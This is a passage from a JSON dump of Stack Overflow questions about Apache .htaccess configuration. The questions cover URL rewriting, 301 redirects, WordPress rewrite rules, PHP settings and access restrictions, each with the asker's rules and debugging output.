up?</p>\n\n<p>Thank you!</p>\n"},{"tags":["php","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12980387,"title":"Overriding PHP configuration options","body":"<p>I am trying to set some php configuration options using <code>.htaccess</code> file and then get them in php. \nIf i write <code>php_value max_execution_time 21</code> then i can run <code>ini_get('max_execution_time')</code> in browser which returns 21 (using CLI it returns \"0\" but I dont know why).</p>\n\n<p>However if I write <code>php_value error_log someValue</code> using <code>ini_get('error_log')</code> it returns boolean false in both browser and CLI. What is wrong with my configuration. How can I get values?</p>\n"},{"tags":["wordpress",".htaccess","redirect","http-status-code-301","dynamic-pages"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12964037,"title":".htaccess and 301 redirect (dynamic pages) wordpress","body":"<p>I read all the other similar questions, but could not understand how to set it up so my old pages redirect where they should.</p>\n\n<p>Here is my set up:</p>\n\n<p>My old site pages:</p>\n\n<p><a href=\"http://www.oldsite.com/blog/?p=1234\" rel=\"nofollow\">http://www.oldsite.com/blog/?p=1234</a><br/>\n<a href=\"http://www.oldsite.com/blog/?p=432\" rel=\"nofollow\">http://www.oldsite.com/blog/?p=432</a><br/>\n<a href=\"http://www.oldsite.com/blog/?p=xxxx\" rel=\"nofollow\">http://www.oldsite.com/blog/?p=xxxx</a><br/></p>\n\n<p>I would like to redirect the first two like so:</p>\n\n<p><a href=\"http://www.oldsite.com/blog/?p=1234\" rel=\"nofollow\">http://www.oldsite.com/blog/?p=1234</a> -> <a href=\"http://www.newsite.com/somewhere/on/mysite/\" rel=\"nofollow\">http://www.newsite.com/somewhere/on/mysite/</a><br/>\n<a href=\"http://www.oldsite.com/blog/?p=432\" rel=\"nofollow\">http://www.oldsite.com/blog/?p=432</a> -> <a href=\"http://www.newsite.com/somewhere/else/on/mysite/\" rel=\"nofollow\">http://www.newsite.com/somewhere/else/on/mysite/</a><br/></p>\n\n<p>and have all other pages (123, 321, 567, 999, ...) redirect to my home page like so:<br/>\n<a href=\"http://www.oldsite.com/blog/?p=\" rel=\"nofollow\">http://www.oldsite.com/blog/?p=</a><strong><em>*</em>****</strong> -> <a href=\"http://www.newsite.com/\" rel=\"nofollow\">http://www.newsite.com/</a><br/></p>\n\n<p>Thanks in advance!</p>\n"},{"tags":[".htaccess","website"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12939840,"title":"Block user using ip and cookies using .htaccess file","body":"<p>can any one help me create a block rule to block a user on the basis of ip,cookie value and visited URL as inputs to .htaccess file.</p>\n\n<p>Few points:</p>\n\n<ol>\n<li>User should be blocked,only from certain directories on website not\nentire site</li>\n<li>Blocked user should be redirected to a specified URL.</li>\n<li>BlockRule need not to set cookies as cookies already exist in user browser,block rule only have to read existing cookie value,match it with one in block rule and do the redirection.</li>\n</ol>\n\n<p><strong>Edit :</strong> jon answered my above query,\nbut i also want to <strong>log these IP(%{REMOTE_ADDR})/cookie values(%{HTTP_COOKIE})</strong> from .htaccess file into some file on server.</p>\n"},{"tags":[".htaccess","mod-rewrite","clean-urls","addressbar"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12976342,"title":"clean URL using .htaccess","body":"<p>I'm trying to redirect the links on my domain.\nWhat I'm trying to achieve is:\nWhen the user clicks on a link to </p>\n\n<p><code>mydomain.com/index.php?dir=myfolder</code></p>\n\n<p>I want him to be redirected to exactly this URL but the browser bar is supposed to show this URL:</p>\n\n<p><code>mydomain.com/myfolder</code></p>\n\n<p>Since I don't have access to how the links are established (it's a php-site) I am trying to do this with just the .htaccess-file.</p>\n\n<p>This is what I have:</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\nRewriteCond %{HTTP_HOST} subdomain.mydomain.com\nRewriteCond %{REQUEST_URI} (.*)/style.css [OR]\nRewriteCond %{REQUEST_URI} (.*)/script.js [OR]\nRewriteCond %{REQUEST_URI} (.*)/logo.png\nRewriteRule (.*) http://www.subdomain.com%{REQUEST_URI} [R=301,NC,L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /index.php?dir=$1 [L]\n</code></pre>\n\n<p>So when I enter <code>\"mydomain.com/myfolder\"</code> into the browser it works fine and the URL in the address-bar stays like this. But when I enter <code>\"mydomain.com/index.php?dir=myfolder\"</code> it works as well but the URL also stays the same (which is not what I want).\nI assume that I need to somehow change the URL with the .htaccess-file and have it then (as I already have) rewritten to then php-scheme.\nI did several approaches now but I have no idea how to do this.\nI hope you understand my question and can help me!</p>\n\n<p>Thank you!</p>\n\n<pre><code>EDIT:\n</code></pre>\n\n<p>The solution ( thanks to @anubhava):</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\n\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,}\\s/+index\\.php\\?dir=([^\\s]+) [NC]\nRewriteRule ^ %1? [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /index.php?dir=/$1 [L]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12971566,"title":".htaccess remove parameters in url redirect","body":"<p>In my .htaccess file I have:</p>\n\n<pre><code>RewriteCond %{query_string} /home/?acc=home&amp;ln=0\nRedirectMatch (.*) http://www.newdomain.com/es/? [R=301,L]\n\nRewriteCond %{query_string} /home/?acc=home&amp;ln=1\nRedirectMatch (.*) http://www.newdomain.com/fr/? [R=301,L]\n</code></pre>\n\n<p>My idea is:</p>\n\n<p>Source: <code>www.domain.com/home/?acc=home&amp;ln=0</code>\nDestination: <code>www.newdomain.com/es/</code></p>\n\n<p>Source: <code>www.domain.com/home/?acc=home&amp;ln=1</code>\nDestination: <code>www.newdomain.com/fr/</code></p>\n\n<p>But my result is:\n<code>www.newdomain.com/es/?</code>\n<code>www.newdomain.com/fr/?</code></p>\n\n<p>How I can remove the \"?\" ?</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":30,"score":-1,"question_id":12975833,"title":"rewrite some of the query strings with an exception condition","body":"<p>I'm new to htaccess usage...</p>\n\n<p>need help on the below</p>\n\n<pre><code>Form http://mysite.com/index.php?page=login to http://mysite.com/login\n</code></pre>\n\n<p>i used the following rule in htaccess</p>\n\n<pre><code>RewriteEngine On\n\nRewriteRule ^([a-zA-Z0-9_-]+)/$ index.php?page=$1\n</code></pre>\n\n<p>in the same, i have to restrict access to <code>mysite.com/admin</code> folder</p>\n\n<p>meanwhile if i enter</p>\n\n<pre><code> `http://mysite.com/admin` then it goes to `http://mysite.com/admin?page=admin`\n</code></pre>\n\n<p>i think this is bcoz of the above rule.</p>\n\n<p>What i need is, if i enter <code>mysite.com/admin</code> that should go for <code>mysite.com/admin/index.php</code></p>\n"},{"tags":["wordpress","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12975816,"title":"Why does Wordpress prevent access to wp-content files on one server but not the other with same htaccess code","body":"<p>I have a strange behavior on my server or on my staging server, we need to see where is the actual problem. Here is some well known code from the popular Wordpress CMS:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n\nAddHandler application/x-httpd-php53 .php\n</code></pre>\n\n<p>The only difference with the original code is the added \"AddHandler\" at the end of the file which is required on our staging hosting provider.</p>\n\n<p>The real issue is that i can access files at the following dummy urls on my development server (internal Ubuntu based 12.04 standard server) and not in production or staging (which are both the same server).</p>\n\n<ol>\n<li>/wp-content/test.php</li>\n<li>/wp-content/themes/test.php</li>\n<li>/wp-content/themes/wpactivis/test.php</li>\n<li>/wp-content/themes/wpactivis/_/test.php</li>\n<li>/wp-content/themes/wpactivis/_/ajax/test.php</li>\n</ol>\n\n<p>Now on one set of servers, these urls return a 404 and Wordpress seems to kick in automaticaly while on our dev server, 200 OK and the file content is return which is the classic \"Hello world\" test...</p>\n\n<p>Can any htaccess guru tell me what should be the real behavior of the code pasted, should it be like the staging servers or the development server.</p>\n\n<p>I tend to think it should be like the development server, any file access or directory access should be granted and not return a 404 because of the :</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n</code></pre>\n\n<p>conditions!</p>\n\n<p>Thank you</p>\n\n<p><em>NOTE: Don't tell me it's a bad way to code wordpress or stuff like that i don't want to hear that. We have a completely secure setup and the fact that files could be accessed directly into my plugins or themes directory is irrelevant. Tons of similar questions are posted on the web but no answer, only people saying you should do that. <strong>What i'm trying here is to get an answer as to why it is doing that on one server and not the other.</em></strong></p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":141,"score":0,"question_id":11841164,"title":".htaccess rule to redirect if file does not exists","body":"<p>Application resides here: <code>http://localhost/reports/</code></p>\n\n<ul>\n<li>reports\n<ul>\n<li>index.php</li>\n<li>daily_stats.php</li>\n<li>controllers<br>\n<ul>\n<li>daily_stats.php //is a controller having br() as action</li>\n</ul></li>\n</ul></li>\n</ul>\n\n<p>I want to write a .htaccess rule as per the foll cases:</p>\n\n<pre><code>case1: http://localhost/reports/daily_stats/  \n           resulting url: http://localhost/reports/daily_stats.php\n\ncase2: http://localhost/reports/daily_stats/br/  \n           resulting url: http://localhost/reports/index.php/daily_stats/br\n</code></pre>\n\n<p>where index.php take cares of routing to contoller</p>\n\n<p>I have written the foll:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /reports/index.php/$1 \n</code></pre>\n\n<p>Problem faced is when i enter <code>http://localhost/reports/daily_stats/br/</code>  it executes the daily_stats.php in the root folder rather the controller</p>\n\n<p>when it see the server variable its like this:</p>\n\n<pre><code>[SCRIPT_FILENAME] =&gt; /var/www/reports/daily_stats.php\n[QUERY_STRING] =&gt; \n[REQUEST_URI] =&gt; /reports/daily_stats/br\n[SCRIPT_NAME] =&gt; /reports/daily_stats.php\n[PATH_INFO] =&gt; /br\n[PATH_TRANSLATED] =&gt; /var/www/br\n[PHP_SELF] =&gt; /reports/daily_stats.php/br\n</code></pre>\n\n<p>should hv been this:\n    [SCRIPT_FILENAME] => /var/www/reports/index.php\n    [QUERY_STRING] => \n    [REQUEST_URI] => /reports/daily_stats/br\n    [SCRIPT_NAME] => /reports/index.php\n    [PATH_INFO] => /daily_stats/br\n    [PATH_TRANSLATED] => /var/www/daily_stats/br\n    [PHP_SELF] => /reports/index.php/daily_stats/br</p>\n\n<p>The rewrite log says:</p>\n\n<pre><code>127.0.0.1 - - [07/Aug/2012:15:22:30 +051800] [localhost/sid#b63fead8][rid#b6ae6058/subreq] (3) [perdir /var/www/reports/] add path info postfix: /var/www/reports/daily_stats.php -&gt; /var/www/reports/daily_stats.php/br\n127.0.0.1 - - [07/Aug/2012:15:22:30 +051800] [localhost/sid#b63fead8][rid#b6ae6058/subreq] (3) [perdir /var/www/reports/] strip per-dir prefix: /var/www/reports/daily_stats.php/br -&gt; daily_stats.php/br\n127.0.0.1 - - [07/Aug/2012:15:22:30 +051800] [localhost/sid#b63fead8][rid#b6ae6058/subreq] (3) [perdir /var/www/reports/] applying pattern '^(.*)$' to uri 'daily_stats.php/br'\n127.0.0.1 - - [07/Aug/2012:15:22:30 +051800] [localhost/sid#b63fead8][rid#b6ae6058/subreq] (4) [perdir /var/www/reports/] RewriteCond: input='/var/www/reports/daily_stats.php' pattern='!-f' =&gt; not-matched\n127.0.0.1 - - [07/Aug/2012:15:22:30 +051800] [localhost/sid#b63fead8][rid#b6ae6058/subreq] (1) [perdir /var/www/reports/] pass through /var/www/reports/daily_stats.php\n127.0.0.1 - - [07/Aug/2012:15:22:30 +051800] [localhost/sid#b63fead8][rid#b6af0058/initial] (3) [perdir /var/www/reports/] add path info postfix: /var/www/reports/daily_stats.php -&gt; /var/www/reports/daily_stats.php/br\n127.0.0.1 - - [07/Aug/2012:15:22:30 +051800] [localhost/sid#b63fead8][rid#b6af0058/initial] (3) [perdir /var/www/reports/] strip per-dir prefix: /var/www/reports/daily_stats.php/br -&gt; daily_stats.php/br\n127.0.0.1 - - [07/Aug/2012:15:22:30 +051800] [localhost/sid#b63fead8][rid#b6af0058/initial] (3) [perdir /var/www/reports/] applying pattern '^(.*)$' to uri 'daily_stats.php/br'\n127.0.0.1 - - [07/Aug/2012:15:22:30 +051800] [localhost/sid#b63fead8][rid#b6af0058/initial] (4) [perdir /var/www/reports/] RewriteCond: input='/var/www/reports/daily_stats.php' pattern='!-f' =&gt; not-matched\n127.0.0.1 - - [07/Aug/2012:15:22:30 +051800] [localhost/sid#b63fead8][rid#b6af0058/initial] (1) [perdir /var/www/reports/] pass through /var/www/reports/daily_stats.php\n</code></pre>\n"},{"tags":["regex","apache",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12952367,"title":"Simple htaccess redirects for a vhost with many domains","body":"<p>I am working on a site that has about 5 or 6 domains, all pointing to the same host and all displaying the same site. I understand what I should really do is make each of the domains redirect to one but the client doesn't want that.</p>\n\n<p>I need to redirect:</p>\n\n<pre><code>xyz.com/abc -&gt; xyz.com/def\naaa.com/abc -&gt; aaa.com/def\nbbb.com/abc -&gt; bbb.com/def\n</code></pre>\n\n<p>where the common factor is mapping abc to def.</p>\n\n<p>Currently I'm using </p>\n\n<pre><code>Redirect /abc http://xyz.com/def\n</code></pre>\n\n<p>But that obviously redirects from any domain to xyz.com which is not what I want. What's the most simple/reliable way of doing these redirects without losing the current domain?</p>\n\n<p>Cheers,\nJohn</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12975421,"title":"htacess server domain","body":"<p>I have some simple redirects in my htaccess file. However, the domain is going to change...I was hoping I could write something that gets the domain name?</p>\n\n<p>Someone suggested : </p>\n\n<pre><code> http://%{HTTP_HOST}/ but this doesnt work. \n</code></pre>\n\n<p>Any ideas?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","httpd"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":439,"score":0,"question_id":9388652,"title":"htaccess RewriteRule fails if page not found","body":"<p>I'm trying to user <code>RewriteRule</code> in my <code>.htaccess</code> file to redirect example.com/page to example.com/page.php (or add the <code>.php</code> to any requested file that does not have an extension.</p>\n\n<p>I tried:</p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !(.*)\\.php\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^([^/.]+)$ $1.php [R]    #I also tried ^(.+)$ with no effect\n</code></pre>\n\n<p>from <a href=\"http://stackoverflow.com/questions/7630996/spoofing-a-404-not-found-error-with-htaccess\">&quot;Spoofing&quot; a 404 not found error with .htaccess</a></p>\n\n<p>I tried this with no other <code>RewriteRule</code>s in my .htaccess, but it still just resolves to the 404 error page via the <code>ErrorDocument</code>. All other rules I try to use also get completely skipped if the requested page is not found. Any rule I specify works if the requested url resolves to an existing page or directory.</p>\n\n<p>I have a Godaddy shared hosting Linux server. I am pretty sure that I cannot edit my httpd.conf file.</p>\n\n<p>I'm wondering if anybody could tell me why my <code>RewriteRule</code>s are ignored when the original request is not a file or directory - when it doesn't exist.</p>\n\n<p>Thank you for any help.</p>\n\n<p><strong>EDIT</strong>:<br>\nI now see that if I go to mysite.com/index.php RewriteRule works. If I go to mysite.com/index RewriteRule does not work. If I go to a page that does not exist at all - mysite.com/asdfasdfsadf then my RewriteRule works. So it only fails on the extensionless version of an existing url.</p>\n"},{"tags":["php",".htaccess","url","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":66,"score":1,"question_id":12971098,"title":"Rewriting URL:s with .htaccess - solution?","body":"<p>Please help me,\na lot of time trying to make SEO optimization via a URL link. htaccess file but I can not.\n<a href=\"http://www.poplat.com/villa/?option=com_resmania&amp;unit_id=1&amp;isGroup=0&amp;act=Unit&amp;task=details&amp;Itemid=282\" rel=\"nofollow\">http://www.poplat.com/villa/?option=com_resmania&amp;unit_id=1&amp;isGroup=0&amp;act=Unit&amp;task=details&amp;Itemid=282</a></p>\n\n<p>The figure should be optimized for SEO, for example:</p>\n\n<p><a href=\"http://www.poplat.com/villa/apartment/dream/\" rel=\"nofollow\">http://www.poplat.com/villa/apartment/dream/</a> ...</p>\n\n<p>I tried to do something in the form, but it does not work:</p>\n\n<pre><code>## Mod_rewrite in use.\nRewriteEngine On\nOptions +FollowSymlinks\n\nRewriteRule ^villa/([^/]+)/([^/]+)ap1-dream /option=com_resmania&amp;unit_id=$1&amp;isGroup=0&amp;act=Unit&amp;task=details&amp;Itemid=$2 [NC]\n</code></pre>\n\n<p>Thank you for your help</p>\n\n<hr>\n\n<p>I tried the command and it does not happen anything. </p>\n\n<pre><code> Options +FollowSymLinks \n    RewriteEngine On \n    RewriteRule ^villa/apartment/dream.html$ villa/?option=com_resmania&amp;unit_id=1&amp;isGroup=0&amp;act=Unit&amp;task=details&amp;Itemid=282 \n</code></pre>\n\n<p>my base of site is CMS joomla 2.5</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12974479,"title":".htaccess URL rewrite - hide the path of actual URL.","body":"<p>In .htaccess i want to show a different image URL to user. I want to hide the path of actual url. \nFor eg: <strong>http://example.com/folder/date/image/images1.jpg</strong>(another extension of image). here date is created dynamically.now i want to display to user as <strong>http://example.com/images/img1.jpg</strong></p>\n"},{"tags":[".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12970394,"title":"htaccess redirection dynamic","body":"<p>I am trying to redirect /en/news/12345 to <a href=\"http://www.xyz.com/en/newsletters/12345\" rel=\"nofollow\">http://www.xyz.com/en/newsletters/12345</a></p>\n\n<p>the only thing is that \"en\" and \"12345\" can change but \"news\" is always the same.</p>\n\n<p>I have the following so far:</p>\n\n<p>RewriteRule /^(.<em>)/news/(.</em>)$ <a href=\"http://www.xyz.com/\" rel=\"nofollow\">http://www.xyz.com/</a>$1/news/$2 [R=301,L]</p>\n\n<p>but if i go to mydomain/wp-admin then i get an endless redirect?? Any ideas why this is happening?</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess",".htpasswd"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":118,"score":1,"question_id":9286755,"title":"variable path to .htpasswd possible?","body":"<p>There is a .htpasswd file in a code base I am working on. The corresponding path to in .htaccess is correct in the production environment but the path does not suit my local environment since the server path is different. </p>\n\n<p>Production: AuthUserFile /var/www/sites/some_dir/.htpasswd</p>\n\n<p>Local Dev: AuthUserFile /path/to/htdocs/some_dir/.htpasswd</p>\n\n<p>Is there a way to make the path to .htpasswd variable, or, if you understand what I am trying to do is there some other way to accomplish this? Thank you in advance.</p>\n"},{"tags":[".htaccess","codeigniter","subfolder"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12973194,"title":"Installing codeigniter in a subfolder and point to the main site?","body":"<p>I'm trying install my codeigniter application in a sub folder: <code>http://website.com/sub_folder</code></p>\n\n<p>And I want that this site is accessible through: <code>http://website.com/</code></p>\n\n<p>I have the following info in my <code>application/config.php</code> file for the base url: <code>$config['base_url']    = 'http://website.com/sub_folder';</code></p>\n\n<p>This is my <code>.htaccess</code>: </p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|images|captcha|assets|favicon\\.gif|robots\\.txt)\nRewriteRule ^(.*)$ /sub_folder/index.php/$1 [L]\n</code></pre>\n\n<p>The problem is that when I change the <code>$config['base_url']</code> to access my asset files, like css etc al my other links using <code>$base_url()</code> point to : <code>http://website.com/sub_folder</code> too instead of <code>http://website.com/</code></p>\n"},{"tags":[".htaccess","seo","http-headers"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12973726,"title":".htaccess 403 404 redirect returned header SEO","body":"<p>A quick question. I want to use a php file that will deliver pages based on the url. I am using htacess to deal with the error docs but my question is to do with SEO. If I redirect a 404/403 request to pageDispacher.php that then delivers the correct page will the header be a 404/403 at any point? As this is not cool. Do I need to use a rewrite rule instead?</p>\n\n<p>In which case is there is a genuine 404 page how would i return a 404 header?</p>\n\n<p>www.example.com > www.example.com/en/home</p>\n\n<p>www.example.com/en/ > www.example.com/en/home</p>\n\n<pre><code>ErrorDocument 404 /pageDispacher.php\nErrorDocument 403 /pageDispacher.php\n</code></pre>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":56,"score":-5,"question_id":12973592,"title":"What do the option FollowSymLinks and Indexes in .htaccess?","body":"<p>I have following two lines in <code>.htaccess</code> file and I just want to know what do they do.</p>\n\n<pre><code>Options +FollowSymLinks\nOptions +Indexes\n</code></pre>\n"},{"tags":["wordpress",".htaccess","trailing-slash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12969750,"title":".htaccess issue in wordpress","body":"<p>In my site the URL </p>\n\n<p>1) <a href=\"http://www.xxx.com/pt-br/perguntas-frequentes/\" rel=\"nofollow\">http://www.xxx.com/pt-br/perguntas-frequentes/</a> - shows error</p>\n\n<p>2) <a href=\"http://www.xxx.com/pt-br/perguntas-frequentes\" rel=\"nofollow\">http://www.xxx.com/pt-br/perguntas-frequentes</a>  -  working fine.</p>\n\n<p>I am using WPML plugin\nCode as follows</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12913179,"title":"getting error 500 with .htaccess when pointing a php file (mod_rewrite)","body":"<p>i made a simple .htaccess file to expose the problem.</p>\n\n<p>I want that all request made to the folder redirect to a subfolder file \"app/index.php\"</p>\n\n<pre><code>RewriteEngine On\n\nRewriteRule (.*) app/index.php [QSA]\n</code></pre>\n\n<p>And this works fine on with the basic url of my hoster (like <code>http//myname.hosting.com/htaccessFolder</code></p>\n\n<p>The problem is that i have a domain pointing on this folder, and when accessed to it, server return <code>Internal Server Error 500</code>.</p>\n\n<p>If i do this :</p>\n\n<pre><code>RewriteEngine On\n\nRewriteRule (.*) somefile.php [QSA]\n</code></pre>\n\n<p>Redirection works only when file does not exists (404 not found error occured). when the file exists i get a 500 error too.</p>\n\n<p>I've asked the hosting support without success for the moment..</p>\n\n<p>EDIT : </p>\n\n<p>Strangely, when i write :</p>\n\n<pre><code>RewriteEngine On\n\nRewriteRule (.*) somefile.txt [QSA]\n</code></pre>\n\n<p>it works on bot, so it seems that the problem comes from executing php files..</p>\n\n<p>EDIT2 :</p>\n\n<p>Here is the real .htaccess file i try to use :</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n\n    #RewriteCond %{REQUEST_FILENAME} -f \n    #RewriteRule .? - [L]\n\n    #####################\n\n    RewriteRule (.*) app/public/$1\n\n    RewriteCond %{REQUEST_FILENAME} -f \n    RewriteRule .? - [L]\n\n    RewriteRule app/public/(.*) $1\n\n\n\n    #####################\n\n    #RewriteCond %{REQUEST_FILENAME} question2answers/(.+)\n    #RewriteRule .? - [L]\n\n    #####################\n\n    #RewriteCond %{REQUEST_FILENAME} !-f\n    #RewriteRule (.*) index.php [L,QSA]\n\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>You can see that only the public block is not commented but when i go to the website i get this :\nThe requested URL /cgi-bin/php5.fcgi/index.php/index.php/index.php/index.php/index.php/index.php/index.php/in.....</p>\n\n<p>but i request a file in the public folder (like <a href=\"http://website.com/css/style.css\" rel=\"nofollow\">http://website.com/css/style.css</a> (which is in public/css) it works as expected.\nWhen i'm not commenting the last block, i get a 500 error.</p>\n"},{"tags":["php","html5",".htaccess","playback"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12972044,"title":"playing mp3 from a folder which has .htaccess restriction for download","body":"<p>I have been trying to make a music streaming website.</p>\n\n<p>I store all the mp3 in www.abc.com/audio folder .</p>\n\n<p>This folder has .htaccess restriction so that none can download any file.</p>\n\n<p>After so much of searching I am unable to find how to play mp3 from this folder using php from this folder. </p>\n\n<p>The PHP code for the play file is filename: play.php</p>\n\n<pre><code>&lt;?php\n//print_r($_GET);\ninclude_once('./functions.php');\n\n$path=getPathFromHash($_GET['value']);   //get path from hash_value ex. www.abc.com/audio/1.mp3\necho $track = getFileNameFromHash($_GET['value']);  //get file name ex. 1.mp3\n\nif (file_exists($track)) {\nheader(\"Content-Type: audio/mpeg\");\nheader('Content-Length: ' . filesize($track));\nheader('Content-Disposition: inline; filename=' . $track);\nheader('X-Pad: avoid browser bug');\nheader('Cache-Control: no-cache');\nreadfile($track);\nexit;\n} else {\n    header($_SERVER['SERVER_PROTOCOL'].' 404 Not Found', true, 404);\n    echo \"no file\";\n}\n\n\n?&gt;\n&lt;audio src=\"&lt;?php echo $path?&gt;\" autoplay loop controls&gt;&lt;/audio&gt;\n</code></pre>\n\n<p>my .htaccess file in audio folder is</p>\n\n<pre><code>&lt;FilesMatch \".(ogg|mp3)$\"&gt;\nOrder Allow,Deny\nDeny from all\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>But after all this, the song is not playing :(\nWhat changes should I make so that song starts to play?</p>\n\n<p>Thank you in advance.</p>\n"},{"tags":["php","apache",".htaccess","slim"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12971537,"title":"Slim Framwork .htaccess HTTPS","body":"<p>I am using slim for an API which is working really well under http but when I request the URL in https i get a 404 error</p>\n\n<p>I think it has something to do with my .htaccess file but I am not sure can anyone point out what I am doing wrong here.</p>\n\n<p>.htaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ index.php [QSA,L]\n</code></pre>\n\n<p>Thanks guy's &amp; gal's</p>\n"},{"tags":["php",".htaccess","iis","rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12970937,"title":"iis rewritecond configration with php","body":"<p>I am using IIs6 as my webserver Here are my rewrite rules</p>\n\n<pre><code>RewriteBase /\nRewriteCond %{REQUEST_FILENAME} \\.(html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|pl|cgi|shtml|shtm|phtm)$\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?$1 [L]　\n</code></pre>\n\n<p>The question is '%{REQUEST_FILENAME} !-f' seems doesn't work ,when I request the url like\nhttp:// somesite/shopadmin/index.php, it still rewrite and jump to access http:// somesite/index.php?xxx ,</p>\n\n<p>how to solve the problem?</p>\n\n<p>I tried many times and It looks like the 'REQUEST_FILENAME' param is different as it works in apache? </p>\n\n<p>Any helps would be thanks.</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12970503,"title":"Simple HTACCESS Rule Rewrite wont work","body":"<pre><code>RewriteRule ^shop _new_shopAll.php [NC]\nRewriteRule ^shop/new _new_shopNew.php [NC]\nRewriteRule ^shop/swarovski _new_shopSwar.php [NC]\nRewriteRule ^shop/signature _new_shopSig.php [NC]\nRewriteRule ^shop/wedding _new_shopWedding.php [NC]\nRewriteRule ^shop/celeb _new_shopCeleb.php [NC]\nRewriteRule ^shop/sale _new_shopSale.php [NC]\nRewriteRule ^shop/sw3 _new_shopSW3.php [NC]\n</code></pre>\n\n<p>I do not seem to realise why shop just works and everything else works with the same? Do $ or $1 need to be added? </p>\n\n<p>I want this to work</p>\n\n<pre><code>/shop?filter=Black = /_new_shopAll.php?filter=Black\n/shop/celeb?filter=Black  = /_new_shopCeleb.php?filter=Black\n/shop = /_new_shopAll.php\n/shop/celeb = /_new_shopCeleb.php\n</code></pre>\n\n<p>Those are separate links.</p>\n"},{"tags":["wordpress",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":127,"score":2,"question_id":12931650,"title":"htaccess redirect problems, Wordpress and static html site not redirecting properly","body":"<p>I'm having problems with a customer's website. I've created a new Wordpress site for him and now I'm having problems with htaccess 